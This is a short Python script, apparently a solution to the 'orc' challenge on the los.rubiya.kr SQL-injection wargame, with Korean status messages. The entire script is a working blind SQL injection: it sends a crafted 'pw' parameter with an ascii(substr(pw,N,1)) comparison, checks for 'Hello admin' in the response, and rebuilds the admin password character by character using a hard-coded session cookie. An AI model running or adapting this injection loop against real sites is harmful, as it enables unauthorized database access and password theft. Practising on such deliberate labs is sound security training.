#import urllib
import requests

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=2"
passid =  {'PHPSESSID': 'un10edfhs1nohl7bc762fp1upq'}
flag = ""

for pw_value in range(1,9):
    for ascii in range(48,128):
          value ="'or id='admin' and ascii(substr(pw,{},1))= {} #".format(pw_value,ascii)
          params = {'pw': value} 
          response = requests.get(url, params=params, cookies=passid)
          if 'Hello admin' in response.text :
            print(pw_value,"번째 pw의 값 : ",chr(ascii))
            flag+=chr(ascii)
            break
          print(pw_value,"번째 값 찾는중 : ",chr(ascii))
print("pw : ",flag)
